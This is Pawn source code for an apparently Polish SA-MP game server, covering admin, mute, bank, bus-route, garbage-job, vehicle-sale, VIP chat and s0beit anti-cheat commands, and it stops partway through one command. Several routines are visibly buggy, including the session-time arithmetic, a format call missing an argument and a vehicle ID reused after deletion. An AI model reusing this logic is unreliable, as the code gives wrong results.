	CMD:pos_object(playerid,params[])
	{
		if(!IsPlayerAdmin(playerid))
			return 0;

		new id;
		if(sscanf(params,"d",id))
			return SendClientMessage(playerid,Zielony,"# Uzyj: "BIALYHEX"/pos_object [id]");

		new object;
		new Float:xo,Float:yo,Float:zo;
		GetPlayerPos(playerid,xo,yo,zo);
		object = CreateObject(id,xo,yo+3,zo,0.0,0.0,0.0);
		EditObject(playerid,object);


		return 1;
	}

	CMD:network(playerid, params[])
	{
		new stats[600+1];
		GetPlayerNetworkStats(playerid, stats, sizeof(stats)); // get your own networkstats
		ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "Statystyki Sieci", stats, "Ok", "");
		return 1;
	}
	CMD:sesja(playerid,params[])
	{
		new stats[400+1];
		new czas = NetStats_GetConnectedTime(playerid);
		new h = czas/3600000;
		new m = czas/60000;
		new s = czas/1000;

		if(s >= 60)
		{
			s -= 60;
		}
		if(m >= 60)
		{
			s -= 60;
		}
		if(s >= 120)
		{
			s -= 120;
		}
		if(m >= 120)
		{
			s -= 120;
		}
		if(s >= 180)
		{
			s -= 180;
		}
		if(s >= 240)
		{
			s -= 240;
		}
		if(s >= 300)
		{
			s -= 300;
		}
		if(s >= 360)
		{
			s -= 360;
		}
		if(s >= 420)
		{
			s -= 420;
		}
		if(s >= 280)
		{
			s -= 480;
		}
		if(s >= 540)
		{
			s -= 540;
		}

		format(stats,sizeof stats,"Przegrales na servere w tej sesji:\n"ZIELONYHEX"w godzinach:%d \nw minutach:%d \nw sekundach: %d",h,m,s); // get your own networkstats
		ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "Sesja", stats, "Ok", "");
		return 1;

	}


	forward unmute(playerid);
	public unmute(playerid)
	{
		SetPVarInt(playerid,"mute",0);

		return SendClientMessage(playerid,Zielony,"# Mozesz juz pisac na czacie!");
	}

	CMD:mute(playerid,params[])
	{
		if(PlayerInfo[playerid][LevelAdmin] <= 0)
			return BrakAdmina(playerid,1);

		new id,minuty;
		if(sscanf(params,"dd",id,minuty))
			return SendClientMessage(playerid,Zielony,"# Uzyj: "BIALYHEX"/mute [id] [czas w minutach]");

		if(!IsPlayerConnected(id))
			return SendClientMessage(playerid,Zielony,"# Gracz nie jest podlaczony z serverem!");

		if(minuty < 1 || minuty > 15)
			return SendClientMessage(playerid,Zielony,"# Gracz moze byc wyciszony w przedziale czasowym: 1 minuta a 15 minut!");

		if(PlayerInfo[id][LevelAdmin] >= 5 && PlayerInfo[playerid][LevelAdmin] != 5)
			return SendClientMessage(playerid,Zielony,"# Czy cie Relly popie***? HeadAdmina?! ");

		new string[200];
		format(string,sizeof string,"# Gracz "BIALYHEX"%s"CZERWONYHEX" zostal wyciszony na "BIALYHEX"%d"CZERWONYHEX" minut!",PlayerName(id),minuty);
		SendClientMessageToAll(Czerwony,string);
		SetPVarInt(id,"mute",1);
		SetTimerEx("unmute",minuty*60000,false,"i",id);


		return 1;
	}

	forward check2(playerid);
	public check2(playerid)
	{
		new id = GetPVarInt(playerid,"sprawdzaid");
		new actionid = 0x5, memaddr = 0x5E8606, retndata = 4;
		SendClientCheck(id, actionid, memaddr, NULL, retndata);
		//printf("[AntyCheat] Check %s: \nID:%d \n:ActionID:%d \nMemaDDR:%s \nNULL:%d \nRetnDATA:%d", PlayerName(id), playerid, actionid, memaddr, NULL, retndata);
		switch(retndata)
		{


			case 4:
			{
				SendClientMessage(playerid,Zielony,"# Check Procedure: "BIALYHEX"RetnData ... OK");
			}

			default:
			{
				SendClientMessage(playerid,Zielony,"# Check Procedure: "BIALYHEX"RetnData ... "CZERWONYHEX"Bad - S0BEIT or modyfication.");
				SetPVarInt(playerid,"sprawdzaid",1337);
			}

		}



		return 1;
	}


	forward check1(playerid);
	public check1(playerid)
	{
		SendClientMessage(playerid,Zielony,"# Check Procedure: "BIALYHEX"ActionID ... OK");
		SendClientMessage(playerid,Zielony,"# Check Procedure: "BIALYHEX"MemaDDR ... OK");
		SendClientMessage(playerid,Zielony,"# Check Procedure: "BIALYHEX"RetnData ... "CZERWONYHEX"Wait...");
		return SetTimerEx("check2",4000,false,"i",playerid);
	}

	CMD:check(playerid,params[])
	{
		if(PlayerInfo[playerid][LevelAdmin] <= 0)
			return BrakAdmina(playerid,1);

		new id;
		if(sscanf(params,"d",id))
			return SendClientMessage(playerid,Zielony,"# Uzyj: "BIALYHEX"/check [id]");

		if(!IsPlayerConnected(id))
			return SendClientMessage(playerid,Zielony,"# Gracz nie jest podlaczony z serverem!");

		printf("[AntyCheat] %s started procedure check modyfications!", PlayerName(id));
		new actionid = 0x5, memaddr = SOBEIT, retndata = 0x4;

		SendClientCheck(id, actionid, memaddr, NULL, retndata);
		printf("[AntyCheat] Check %s: \nID:%d \n:ActionID:%d \nMemaDDR:%s \nNULL:%d \nRetnDATA:%d", PlayerName(id), playerid, actionid, memaddr, NULL, retndata);
		switch(retndata)
		{


			case 4:
			{
				SetPVarInt(playerid,"sprawdzaid",id);
				printf("[AntyCheat] %s - Clear", PlayerName(id));
				SetTimerEx("check1",1000,false,"i",playerid);
			}
			default:
			{
				SetPVarInt(playerid,"sprawdzaid",id);
				printf("[AntyCheat] %s - modyfication: s0beit or d3d9.dll!!!", PlayerName(id));
				SetTimerEx("check1",1000,false,"i",playerid);
			}

		}

		return 1;
	}
	CMD:t(playerid,params[])
	{
		new text[150];
		if(sscanf(params,"s[200]",text))
			return SendClientMessage(playerid,Zielony,"# Uzyj: "BIALYHEX"/t [text]");

		for(new i=0; i < GetMaxPlayers(); i++)
		{
			if(IsPlayerConnected(i) && PlayerInfo[i][Team] == PlayerInfo[playerid][Team])
			{
				new str[200];
				format(str,sizeof str,"# T: %s - %d : "BIALYHEX"%s",PlayerName(playerid),playerid,text);
				SendClientMessage(i,Pomaranczowy,str);
			}
		}

		return 1;
	}

	CMD:linia(playerid,params[])
	{
		if(PlayerInfo[playerid][Team] != COMPANY_LINIA)
			return SendClientMessage(playerid, Szary, "# Brak odpowiednich uprawnien do tej komendy!");

		new linid;
		if(sscanf(params,"d",linid))
			return SendClientMessage(playerid,Zielony,"# Uzyj: "BIALYHEX"/linia [kurs]");

		if(linid > sizeof(KursInfo)-1)
			return SendClientMessage(playerid, Szary, "# Ten kurs nie istnieje!");

		if(GetPVarInt(playerid, "playerKurs") != -1)
			return SendClientMessage(playerid, Szary, "# Skoncz aktualny kurs!");

		new vehid = GetPlayerVehicleID(playerid);

		if(GetVehicleModel(vehid) == 431 || GetVehicleModel(vehid) == 437)
		{



			SetPVarInt(playerid,"playerKurs",linid);
			SetPVarInt(playerid,"playerPrzystanek",0);

			new kID = KursInfo[linid][kurs1];

			SetPlayerMapIcon(playerid,70,LiniaInfo[kID][linx],LiniaInfo[kID][liny],LiniaInfo[kID][linz],53 , 0, MAPICON_GLOBAL);

			new string[150];
			format(string,sizeof string,"# Kurs na przystanek: "BIALYHEX"%s",LiniaInfo[kID][linname]);
			SendClientMessage(playerid, Zielony, string);
		}
		else
		{

			SendClientMessage(playerid, Szary, "# Nie jestes w odpowiednim pojezdzie!");

		} // Copyright (c) 2014-2015 KapiziaK aka Kapiza2,Kapiza3,Kapiza4,Kapiza5...

		return 1;
	}

	CMD:sprzedaj(playerid,params[])
	{
		new vehid = GetPlayerVehicleID(playerid);

		if(vehid == 0)
			return SendClientMessage(playerid, Szary, "# Nie jestes w pojezdzie!");

		if(strcmp(VehicleInfo[vehid][Owner],PlayerName(playerid),false))
			return SendClientMessage(playerid, Szary, "# Nie masz kluczykow od tego auta!");

		if(!IsPlayerInRangeOfPoint(playerid, SALON_RANGE, SALON_X, SALON_Y, SALON_Z))
			return SendClientMessage(playerid, Szary, "# Musisz byc w salonie!");


		new string[150];

		new coutsell = VehicleInfo[vehid][Rynkowa]/2;
		format(string,sizeof string,"# Sprzedales pojazd uID: %d i dostales "BIALYHEX"$%d",coutsell);
		SendClientMessage(playerid, Zielony, string);
		GiveMoneyEx(playerid,coutsell);

		VehicleInfo[vehid][sell] = 1;

		new brak[25];
		format(brak,25,"Brak");
		VehicleInfo[vehid][Owner] = brak;



		new buffer[300];
		new Float:xp;
		new Float:yp;
		new Float:zp;
		new Float:ap;
		GetVehiclePos(vehid,xp,yp,zp);
		GetVehicleZAngle(vehid,ap);
		format(buffer,sizeof buffer,"UPDATE `vehicles` SET `owner`='Brak',`x`='%f',`y`='%f',`z`='%f',`a`='%f',`sell`='1' WHERE id='%d'",xp,yp,zp,ap,VehicleInfo[vehid][UID]);
		mysql_query(buffer);
		printf("[ADMIN LOG] %s ustawil wartosc POZYCJA u auta %d na : %f %f %f %f",Player(playerid),VehicleInfo[vehid][UID],xp,yp,zp,ap);
		SendClientMessage(playerid,Zielony,"Wartosc tego auta POZYCJA zostala poprawnie zmieniona!");
		DestroyVehicle(vehid);
		vehid = AddStaticVehicleEx(VehicleInfo[vehid][Model],xp,yp,zp,ap,VehicleInfo[vehid][Color1],VehicleInfo[vehid][Color2], 60*10000);
		//SetVehicleNumberPlate(vehid, VehicleInfo[vehid][Owner]);
		SetVehicleToRespawn(vehid);
		//SetPlayerPos(playerid,xp,yp+3,zp);


		format(logstring,sizeof logstring,"Sprzedaje auto %d za $%d",VehicleInfo[vehid][UID],coutsell);
		AddLog(PlayerName(playerid),logstring);

		SetPlayerPos(playerid,SALON_X_SELL,SALON_Y_SELL,SALON_Z_SELL);



		//new string[150];
		format(string,sizeof string,"Pojazd jest na sprzedaz:\n{FFFFFF}$%d",VehicleInfo[vehid][Price]);
		sell3d[vehid] = Create3DTextLabel(string, 0x00CC00FF, 0.0,0.0,0.0, 100.0, 0);
		Attach3DTextLabelToVehicle(sell3d[vehid], vehid, 0.0, 0.0, 0.0);
	



		return 1;
	}
	public trashOK(trashid)
	{

		new string[150];
		format(string,sizeof string,"Kosz\n"BIALYHEX"%d",trashid);
		UpdateDynamic3DTextLabelText(trash3Dtext[trashid], 0x009e05FF, string);
		TrashInfo[trashid][clear] = false;

		return 1;
	}
	CMD:kosz(playerid,params[])
	{
		if(PlayerInfo[playerid][Team] != COMPANY_SITA)
			return SendClientMessage(playerid, Szary, "# Brak odpowiednich uprawnien do tej komendy!");

		new vehid = GetPlayerVehicleID(playerid);

		if(vehid == 0)
			return SendClientMessage(playerid, Szary, "# Nie jestes w pojezdzie!");

		if(GetVehicleModel(vehid) != 408)
			return SendClientMessage(playerid, Szary, "# Nie jestes w odpowiednim pojezdzie!");

		new trashid;
		if(sscanf(params,"d",trashid))
			return SendClientMessage(playerid,Zielony,"# Uzyj: "BIALYHEX"/kosz [id]");

		if(!IsPlayerInRangeOfPoint(playerid, 10.0, TrashInfo[trashid][trashX],TrashInfo[trashid][trashY],TrashInfo[trashid][trashZ]))
			return SendClientMessage(playerid, Szary, "# Ten kosz nie znajduje sie obok Ciebie!");

		if(VehicleInfo[vehid][Trashes] >= MAX_TRASHES)
			return SendClientMessage(playerid, Szary, "# Masz juz maksymalna ilosc koszy w smieciarce!");


		if(TrashInfo[trashid][clear] == true)
			return SendClientMessage(playerid, Szary, "# Ten smietnik jest oczyszczony!");

		VehicleInfo[vehid][Trashes]++;
		TrashInfo[trashid][clear] = true;
		new string[150];

		format(string,sizeof string,""CZERWONYHEX"Kosz oprozniony\n"BIALYHEX"%d",trashid);
		UpdateDynamic3DTextLabelText(trash3Dtext[trashid], 0x009e05FF, string);

		if(trashid == 69) SendClientMessage(playerid, Zielony, "# Ohh, kosz 69, ahh ty zboczencu :*");

		SendClientMessage(playerid, Zielony, "# Kosz "BIALYHEX"oprozniony");
		SendClientMessage(playerid, Zolty, "Wynagrodzenie: {FFFFFF}$5 i 5 score"); // ustawiasz se wynagrodzenie
		GiveMoneyEx(playerid,5);
		GiveScoreEx(playerid,GetScoreEx(playerid)+5);
		Earned(playerid,5,"Oproznienie kosza");

		if(PlayerInfo[playerid][VIP] == 1)
		{
			SendClientMessage(playerid,Zolty,"Dodatkowa premia za konto premium:{FFFFFF}$5 i 5 score ");
			GiveMoneyEx(playerid,5);
			GiveScoreEx(playerid,GetScoreEx(playerid)+5);
			Earned(playerid,5,"Oproznienie kosza, vip premia");
		}
		SetTimerEx("trashOK",TRASH_OK_MIN*60000,false,"i",trashid);

		return 1;
	}

	CMD:oproznij(playerid,params[])
	{
		if(PlayerInfo[playerid][Team] != COMPANY_SITA)
			return SendClientMessage(playerid, Szary, "# Brak odpowiednich uprawnien do tej komendy!");

		new vehid = GetPlayerVehicleID(playerid);

		if(vehid == 0)
			return SendClientMessage(playerid, Szary, "# Nie jestes w pojezdzie!");

		if(GetVehicleModel(vehid) != 408)
			return SendClientMessage(playerid, Szary, "# Nie jestes w odpowiednim pojezdzie!");

		if(VehicleInfo[vehid][Trashes] != MAX_TRASHES)
			return SendClientMessage(playerid, Szary, "# Nie masz zapelnionej smieciarki!");

		if(!IsPlayerInRangeOfPoint(playerid, TRASH_RANGE,TRASH_X,TRASH_Y,TRASH_Z))
			return SendClientMessage(playerid, Szary, "# Musisz byc na wyspisku!");

		SendClientMessage(playerid,Zielony,"# Oprozniles pomyslnie smieciarke!");
		SendClientMessage(playerid, Zolty, "Wynagrodzenie: {FFFFFF}$50 i 25 score");
		GiveMoneyEx(playerid,50);
		GiveScoreEx(playerid,GetScoreEx(playerid)+25);
		Earned(playerid,50,"Oproznienie smieciarki");
		VehicleInfo[vehid][Trashes] = 0;

		return 1;
	}
	CMD:sayplayer(playerid, params[])
	{
		if(PlayerInfo[playerid][LevelAdmin] <= 5)
			return BrakAdmina(playerid,6);
		new gracz, zn = strfind(params, " ");
		if(zn == -1)
			return SendClientMessage(playerid, -1, "/sayplayer [gracz] [tekst]");
		params[zn] = EOS;
		gracz = strval(params);
		if(!IsPlayerConnected(gracz))
			return SendClientMessage(playerid, -1, "Z?e id gracza!");
		SendPlayerMessageToAll(gracz, params[zn + 1]);
		return 1;
	}
	/*
	CMD:bar(playerid, params[])
	{
		if(IsPlayerInRangeOfPoint(playerid, 5.0,1102.1355,1777.6538,12.3078))
		{
			ShowPlayerDialog(playerid, BAR, DIALOG_STYLE_LIST, "{00AFFF}Bar:", ""ZIELONYHEX"Cygaro\n"ZIELONYHEX"Piwo\n"ZIELONYHEX"Wino\n"ZIELONYHEX"Sprunk", "Zatwierdz", "Anuluj");
		}
		return 1;
	}*/
	CMD:taniec(playerid, params[])
	{
		if(IsPlayerInRangeOfPoint(playerid, 5.0, 1101.7699,1772.5360,12.3078))
		{
			ShowPlayerDialog(playerid, DANCE, DIALOG_STYLE_LIST, "{00AFFF}Taniec:", ""ZIELONYHEX"Style 1\n"ZIELONYHEX"Style 2\n"ZIELONYHEX"Style 3\n"ZIELONYHEX"Style 4", "Zatwierdz", "Anuluj");
		}
		return 1;
	}
	CMD:add_trash(playerid,params[])
	{
		if(PlayerInfo[playerid][LevelAdmin] <= 5)
			return BrakAdmina(playerid,6);

		new query[250];
		new Float:trX,Float:trY,Float:trZ;
		GetPlayerPos(playerid,trX,trY,trZ);
		format(query,sizeof query,"INSERT INTO `trashes`(`X`,`Y`,`Z`) VALUES ('%f','%f','%f')",trX,trY,trZ);
		mysql_query(query);

		SendClientMessage(playerid,Zielony,"# Kosz || "BIALYHEX"Dodany!");

		return 1;
	}
	forward unactiv_hw();
	public unactiv_hw()
	{
		BonusCargo = false;
		SendClientMessageToAll(JasnyNiebieski,"# HappyWorld wygasl! :'(");
		SendRconCommand("mapname "MAPNAME"");
		TextDrawHideForAll(hwTD);
		TextDrawHideForAll(hwusebox);


		return printf("[BONUS] HappyWorld zostal wylaczony za pomoca timera!");
	}
	CMD:active_bonus(playerid,params[])
	{
		if(PlayerInfo[playerid][LevelAdmin] <= 5)
			return BrakAdmina(playerid,6);

		if(BonusCargo == true)
		{
			SendClientMessage(playerid, Czerwony, "# Bonus zostal dezaktywowany!");
			BonusCargo = false;
			KillTimer(TimerHW);
			SendRconCommand("mapname "MAPNAME"");
			TextDrawHideForAll(hwTD);
			TextDrawHideForAll(hwusebox);
			printf("[BONUS] Bonus zostal OFF przez %s",PlayerName(playerid));

		}
		else if(BonusCargo != true)
		{
			SendClientMessage(playerid, Zielony, "# Bonus zostal aktywowany");
			BonusCargo = true;
			SendRconCommand("mapname HappyWorld!");
			TimerHW = SetTimer("unactiv_hw",HW_TIME*60000,false);

			TextDrawShowForAll(hwTD);
			TextDrawShowForAll(hwusebox);
			printf("[BONUS] Bonus zostal ON przez %s",PlayerName(playerid));
		}



		return 1;
	}

	CMD:happyworld(playerid,params[])
	{

		if(BonusCargo == true)
		return SendClientMessage(playerid,Szary,"# HappyWorld jest jeszcze aktywny!");

		if(HW_PRICE > GetMoneyEx(playerid))
		return SendClientMessage(playerid,Szary,"# Nie stac Cie na happyworld!");

		if(GetPVarInt(playerid,"hwcmd") != 1)
		{
			SendClientMessage(playerid,Szary,"# HappyWorld kosztuje 20.000$! Aby aktywowac HW wpisz komende jeszcze raz!");
			return SetPVarInt(playerid,"hwcmd",1);
		}


		SetPVarInt(playerid,"hwcmd",0);
		GiveMoneyEx(playerid,-HW_PRICE);


		new string[150];
		format(string,sizeof string,"# HappyWorld zostal aktywowany przez "BIALYHEX"%s"ZIELONYHEX" na 30 min.",PlayerName(playerid));
		SendClientMessageToAll(Zielony,string);

		TimerHW = SetTimer("unactiv_hw",HW_TIME*60000,false);

		BonusCargo = true;

		TextDrawShowForAll(hwTD);
		TextDrawShowForAll(hwusebox);

		SendRconCommand("mapname HappyWorld!");

		return 1;
	}

	new pacholki[5]; //tutaj mozemy ustalic maksymalna ilosc pacholkow. Teraz mozna ich stworzyc 20.

	CMD:pacholek(playerid,params[])
	{

		if(IsPlayerInAnyVehicle(playerid))
		{
			SendClientMessage(playerid,Czerwony,"Jestes w pojezdzie!");
			return 1;
		}
		for(new i = 0; i<sizeof pacholki; i++)
		{
			if(!pacholki[i])
			{
				new Float:Pose[3];
				GetPlayerPos(playerid,Pose[0],Pose[1],Pose[2]);
				pacholki[i] = CreateObject(1238,Pose[0], Pose[1], Pose[2]-0.5, 0.0, 0.0000, 0);
				SendClientMessage(playerid,Zielony,"Pacholek postawiony!");
				return 1;
			}
		}
		return SendClientMessage(playerid,Czerwony,"Postawiles juÂ¿ maximum pacholkow! Uzyj: /usunpacholek aby usunÂ¹Ã¦ pacholek");
	}


	CMD:del_pacholek(playerid,params[]) //usuwa pacholek w promieniu 3 metrow od gracza.
	{
		if(IsPlayerInAnyVehicle(playerid))
		{
			SendClientMessage(playerid,Czerwony,"Jestes w pojezdzie!");
			return 1;
		}
		new Float:Pose[3];
		for(new i=0; i<sizeof pacholki; i++)
		{
			GetObjectPos(pacholki[i],Pose[0], Pose[1], Pose[2]);
			if(IsPlayerInRangeOfPoint(playerid,3.0, Pose[0], Pose[1], Pose[2]))
			{
				DestroyObject(pacholki[i]);
				pacholki[i]=0;
				SendClientMessage(playerid,Zielony,"Pacholek usuniety!");
				return 1;
			}
		}
		return SendClientMessage(playerid,Czerwony,"Brak pacholkow w promieniu 3 metrow!");
	}


	CMD:del_all_p(playerid,params[])
	{
		if(IsPlayerInAnyVehicle(playerid))
		{
			SendClientMessage(playerid,Czerwony,"Jestes w pojezdzie!");
			return 1;
		}
		new idx=0,str[50];
		for(new i=0; i<sizeof pacholki; i++)
		{
			if(pacholki[i])
			{
				DestroyObject(pacholki[i]);
				pacholki[i]=0;
				idx++;
			}
		}
		format(str,50,"UsunÂ¹Â³eÅ“ %d pachoÂ³kÃ³w!", idx);
		SendClientMessage(playerid,Zielony,str);
		return 1;
	}
	new barierki[5]; //tutaj mozemy ustalic maksymalna ilosc pacholkow. Teraz mozna ich stworzyc 20.

	CMD:barierka(playerid,params[])
	{

		if(IsPlayerInAnyVehicle(playerid))
		{
			SendClientMessage(playerid,Czerwony,"Jestes w pojezdzie!");
			return 1;
		}
		for(new i = 0; i<sizeof barierki; i++)
		{
			if(!barierki[i])
			{
				new Float:Posd[3];
				GetPlayerPos(playerid,Posd[0],Posd[1],Posd[2]);
				barierki[i] = CreateObject(3578,Posd[0], Posd[1], Posd[2]-0.5, 0.0, 0.0000, 0);
				SendClientMessage(playerid,Zielony,"Barierka postawiona!");
				return 1;
			}
		}
		return SendClientMessage(playerid,Czerwony,"Postawiles juz maximum barierek! Uzyj: /usunbarierke aby usunac barierke");
	}


	CMD:del_barierka(playerid,params[]) //usuwa pacholek w promieniu 3 metrow od gracza.
	{
		if(IsPlayerInAnyVehicle(playerid))
		{
			SendClientMessage(playerid,Czerwony,"Jestes w pojezdzie!");
			return 1;
		}
		new Float:Posd[3];
		for(new i=0; i<sizeof barierki; i++)
		{
			GetObjectPos(barierki[i],Posd[0], Posd[1], Posd[2]);
			if(IsPlayerInRangeOfPoint(playerid,3.0, Posd[0], Posd[1], Posd[2]))
			{
				DestroyObject(barierki[i]);
				barierki[i]=0;
				SendClientMessage(playerid,Zielony,"Barierka usunieta!");
				return 1;
			}
		}
		return SendClientMessage(playerid,Czerwony,"Brak barierek w promieniu 3 metrow!");
	}


	CMD:dell_all_b(playerid,params[])
	{
		if(IsPlayerInAnyVehicle(playerid))
		{
			SendClientMessage(playerid,Czerwony,"Jestes w pojezdzie!");
			return 1;
		}
		new idx=0,str[50];
		for(new i=0; i<sizeof barierki; i++)
		{
			if(barierki[i])
			{
				DestroyObject(barierki[i]);
				barierki[i]=0;
				idx++;
			}
		}
		format(str,50,"Usunales %d barierek!", idx);
		SendClientMessage(playerid,Zielony,str);
		return 1;
	}
	CMD:red(playerid, params[])
	{
		new text[256];
		new string[256];
		new color;
		if(PlayerInfo[playerid][VIP] != 1)
			return SendClientMessage(playerid, Czerwony, "Nie posiadasz konta premium!");
		if(sscanf(params, "s", text))
			return SendClientMessage(playerid, Bialy, "/red [Tekst]");
		if(IsPlayerConnected(playerid))
		{
			format(string,sizeof string,"{%x}%s:"BIALYHEX" VIP - (%d) : {FF0000}%s",color,PlayerName(playerid),playerid,text);
			SendClientMessage(playerid, GetPlayerColor(playerid), string);
		}
		return 1;
	}

	CMD:green(playerid, params[])
	{
		new text[256];
		new string[256];
		new color;
		if(PlayerInfo[playerid][VIP] != 1)
			if(PlayerInfo[playerid][VIP] != 1)
				return SendClientMessage(playerid, Czerwony, "Nie posiadasz konta premium!");
		if(sscanf(params, "s", text))
			return SendClientMessage(playerid, Bialy, "/green [Tekst]");
		if(IsPlayerConnected(playerid))
		{
			format(string,sizeof string,"{%x}%s:"BIALYHEX" VIP - (%d) : {00CC00}%s",color,PlayerName(playerid),playerid,text);
			SendClientMessage(playerid, GetPlayerColor(playerid), string);
		}
		return 1;
	}

	CMD:blue(playerid, params[])
	{
		new text[256];
		new string[256];
		new color;
		if(PlayerInfo[playerid][VIP] != 1)
			if(PlayerInfo[playerid][VIP] != 1)
				return SendClientMessage(playerid, Czerwony, "Nie posiadasz konta premium!");
		if(sscanf(params, "s", text))
			return SendClientMessage(playerid, Bialy, "/blue [Tekst]");
		if(IsPlayerConnected(playerid))
		{
			format(string,sizeof string,"{%x}%s:"BIALYHEX" VIP - (%d) : {0000FF}%s",color,PlayerName(playerid),playerid,text);
			SendClientMessage(playerid, GetPlayerColor(playerid), string);
		}
		return 1;
	}

	CMD:grey(playerid, params[])
	{
		new text[256];
		new string[256];
		new color;
		if(PlayerInfo[playerid][VIP] != 1)
			if(PlayerInfo[playerid][VIP] != 1)
				return SendClientMessage(playerid, Czerwony, "Nie posiadasz konta Premium!");
		if(sscanf(params, "s", text))
			return SendClientMessage(playerid, Bialy, "/grey [Tekst]");
		if(IsPlayerConnected(playerid))
		{
			format(string,sizeof string,"{%x}%s:"BIALYHEX" VIP - (%d) : {B0B0B0}%s",color,PlayerName(playerid),playerid,text);
			SendClientMessage(playerid, GetPlayerColor(playerid), string);
		}
		return 1;
	}
	CMD:namex(playerid, params[])
	{
		if(PlayerInfo[playerid][LevelAdmin] <= 5)
			return BrakAdmina(playerid,6);
		new name[64], string[256];
		if(sscanf(params, "s", name))
			return SendClientMessage(playerid, Bialy, "/namex [Nick]");
		SetPlayerName(playerid, name);
		format(string, sizeof(string), "# Zmieniles nick na {FFFFFF}%s", name);
		SendClientMessage(playerid, JasnyZielony, string);
		return 1;
	}
	CMD:wyrzuctowar(playerid,params[])
	{
		if(PlayerInfo[playerid][LevelAdmin] <= 5)
			return BrakAdmina(playerid,6);
		new vehid = GetPlayerVehicleID(playerid);
		new modelt = GetVehicleTrailer(vehid);
		new dllt = GetVehicleIDTrailer(playerid,vehid,modelt);
		RemoveOrder(PlayerInfo[playerid][UID],dllt);
		VehicleInfo[dllt][KM] = 0.00;
		VehicleInfo[dllt][Towar] = 0;
		TextDrawSetString(towartd[playerid]," ");
		TextDrawHideForPlayer(playerid,towartd[playerid]);

		format(logstring,sizeof logstring,"Wyrzuca towar z naczepy %d",dllt);
		AddLog(PlayerName(playerid),logstring);

		return 1;
	}
	/*CMD:cruzz(playerid,params[])
	{
		new kwota;
		if(sscanf(params,"dd",kwota))
			return SendClientMessage(playerid,Czerwony,"Uzyj: "BIALYHEX"/wplac [kwota]");
		if(GetMoneyEx(playerid) < kwota)
			return SendClientMessage(playerid,Czerwony,"Nie posiadasz takiej kwoty!");

		if(kwota <= 0)
			return SendClientMessage(playerid,Zielony,"# Nie oszukasz systemu!");
		GiveMoneyEx(playerid,-kwota);
		wplac(playerid,kwota);
		return 1;
	}*/
	CMD:piwo(playerid,params[])
	{
		if(IsPlayerInRangeOfPoint(playerid, 5.0,1102.1355,1777.6538,12.3078))
		{
			GivePlayerMoney(playerid, -15);
			SetPlayerSpecialAction(playerid, SPECIAL_ACTION_DRINK_BEER);
			PlayerInfo[playerid][Promile] += 1;
			SendClientMessage(playerid,Niebieski,"Piwko, to jest to...");
		}
		return 1;
	}

	CMD:wyplac(playerid,params[])
	{
		if(isnull(params))
			return SendClientMessage(playerid,Czerwony,"Uzyj: "BIALYHEX"/wyplac [kwota]");
		new kwota = strval(params), kwota2;

		new str[128];
		format(str, sizeof str, "SELECT `bank` FROM `users` WHERE `id` = '%d'", PlayerInfo[playerid][UID]);
		mysql_query(str);
		mysql_store_result();
		mysql_fetch_row(str);
		sscanf(str, "p<|>d", kwota2);
		mysql_free_result();

		if(kwota2 < kwota)
			return SendClientMessage(playerid,Czerwony,"Nie posiadasz takiej kwoty!");

		if(kwota <= 0)
			return SendClientMessage(playerid,Zielony,"# Nie oszukasz systemu!");
		GiveMoneyEx(playerid,kwota);
		wyplac(playerid,kwota);

		format(logstring,sizeof logstring,"Wyplaca z banku %d",kwota);
		AddLog(PlayerName(playerid),logstring);

		return 1;
	}
	stock wyplac(playerid,kwota)
	{
		new query[200];
		format(query,sizeof query,"UPDATE `users` SET `bank` = `bank` - '%d' WHERE `id` = '%d'",kwota,PlayerInfo[playerid][UID]);
		mysql_query(query);

		format(query,sizeof query,"INSERT INTO `bank`(`uid`,`uidto`,`price`,`text`) VALUES ('%d','1','%d','Wyplata pieniedzy z banku')",PlayerInfo[playerid][UID],kwota);
		mysql_query(query);

		format(query,sizeof query,"# Wyplaciles z banku "BIALYHEX"$%d",kwota);
		SendClientMessage(playerid,Zielony,query);

		return printf("[LOGS] Gracz %s wyplacil z banku: $%d",PlayerName(playerid),kwota);
	}

	CMD:wplac(playerid,params[])
	{
		if(isnull(params))
			return SendClientMessage(playerid,Czerwony,"Uzyj: "BIALYHEX"/wplac [kwota]");
		new kwota = strval(params);

//		new str[128];
		/*format(str, sizeof str, "SELECT `bank` FROM `users` WHERE `id` = '%d'", PlayerInfo[playerid][UID]);
		mysql_query(str);
		mysql_store_result();
		mysql_fetch_row(str);
		sscanf(str, "p<|>d", kwota2);
		mysql_free_result();

		if(kwota2 < kwota)
			return SendClientMessage(playerid,Czerwony,"Nie posiadasz takiej kwoty!");*/

		if(kwota > GetMoneyEx(playerid))
			return SendClientMessage(playerid,Czerwony,"Nie posiadasz takiej kwoty!");

		if(kwota <= 0)
			return SendClientMessage(playerid,Zielony,"# Nie oszukasz systemu!");
		GiveMoneyEx(playerid,-kwota);
		wplac(playerid,kwota);

		format(logstring,sizeof logstring,"Wplaca do banku %d",kwota);
		AddLog(PlayerName(playerid),logstring);
		return 1;
	}
	stock wplac(playerid,kwota)
	{
		new query[200];
		format(query,sizeof query,"UPDATE `users` SET `bank` = `bank` + '%d' WHERE `id` = '%d'",kwota,PlayerInfo[playerid][UID]);
		mysql_query(query);

		format(query,sizeof query,"INSERT INTO `bank`(`uid`,`uidto`,`price`,`text`) VALUES ('1','%d','%d','Wplata pieniedzy do banku')",PlayerInfo[playerid][UID],kwota);
		mysql_query(query);

		format(query,sizeof query,"# Wplaciles do banku "BIALYHEX"$%d",kwota);
		SendClientMessage(playerid,Zielony,query);

		return printf("[LOGS] Gracz %s wplacil do banku: $%d",PlayerName(playerid),kwota);
	}
	CMD:car_th(playerid,params[])
	{
		if(PlayerInfo[playerid][LevelAdmin] <= 1)
			return BrakAdmina(playerid,2);


		new id;

		if(sscanf(params,"d",id))
			return SendClientMessage(playerid,Czerwony,"Uzyj: "BIALYHEX"/car_th [id pojazdu]");

		if(id < 1)
			return SendClientMessage(playerid,Szary,"[#] Podales zle ID pojazdu!");

		new Float:vX[3];
		GetPlayerPos(playerid,vX[0],vX[1],vX[2]);
		SetVehiclePos(id,vX[0],vX[1]+3,vX[2]+1);


		format(logstring,sizeof logstring,"Teleportuje do siebie pojazd %d",id);
		AddLog(PlayerName(playerid),logstring);

		return 1;
	}
	CMD:bilety(playerid,params[])
	{
		new string[150];
		format(string,sizeof string,"Posiadasz: "BIALYHEX"%d "ZIELONYHEX"biletow!",PlayerInfo[playerid][Bilety]);
		SendClientMessage(playerid, Zielony, string);

		return 1;
	}

	CMD:active_free_vip(playerid,params[])
	{
		if(PlayerInfo[playerid][LevelAdmin] <= 5)
